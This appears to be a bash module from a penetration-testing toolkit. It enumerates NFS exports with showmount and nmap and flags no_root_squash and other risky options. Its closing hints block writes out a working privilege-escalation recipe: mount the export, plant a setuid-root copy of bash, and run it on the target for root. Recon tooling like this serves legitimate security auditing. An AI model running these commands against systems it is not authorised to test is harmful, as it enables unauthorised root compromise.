#!/usr/bin/env bash
# enum-nfs.sh — NFS exports + no_root_squash detection.
set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "nfs: $(wc -l < "$TARGETS") targets -> $OUT"

IPS=$(ips_only "$TARGETS")

# showmount -e (MOUNT protocol via rpcbind/111 — returns nothing on NFSv4-only)
if have showmount; then
    for ip in $IPS; do
        mkdir -p "$OUT/$ip"
        showmount -e "$ip" 2>&1 | tee "$OUT/$ip/exports.txt" || true
        ex="$OUT/$ip/exports.txt"
        # Deterministic dangerous-export markers so report.py grades them (the
        # no_root_squash HIGH rule previously relied on the string appearing by luck).
        if grep -qiE '\bno_root_squash\b' "$ex" 2>/dev/null; then
            crit "NFS no_root_squash export on $ip — mount + setuid-root = local root:"
            grep -iE '\bno_root_squash\b' "$ex" | sed "s/^/    /"
        fi
        grep -qiE '\bno_all_squash\b' "$ex" 2>/dev/null && hit "NFS no_all_squash export on $ip (uid-preserving writes)"
        grep -qiE '\binsecure\b' "$ex" 2>/dev/null && hit "NFS insecure export on $ip (allows >1024 source ports)"
        # NFSv4-only servers have no rpcbind, so showmount fails — flag it so an
        # empty result isn't misread as "no shares".
        if grep -qiE 'RPC: Program not registered|clnt_create|Connection refused|no such' "$ex" 2>/dev/null; then
            hit "NFS: showmount failed on $ip — likely NFSv4-only (no MOUNT/rpcbind). Try: mount -t nfs4 -o ro $ip:/ /mnt"
        fi
    done
fi

# nmap rpcinfo + nfs-* scripts
if have nmap; then
    log "nmap rpcinfo / nfs-showmount / nfs-ls"
    nmap -Pn $(nmap_bound_args) -p111,2049 --script 'rpcinfo,nfs-showmount,nfs-ls,nfs-statfs' \
        -iL <(echo "$IPS") -oA "$OUT/nmap-nfs" >/dev/null 2>&1 || true
fi

# Hint for exploitation
cat > "$OUT/_hints.txt" <<'EOF'
If exports show (rw,no_root_squash) you can:
    mkdir /tmp/nfs && sudo mount -o vers=3 <ip>:<export> /tmp/nfs
    cp /bin/bash /tmp/nfs/x && sudo chown root:root /tmp/nfs/x && sudo chmod u+s /tmp/nfs/x
    # On target: /export/x -p   -> uid 0
EOF

log "nfs dispatcher done."
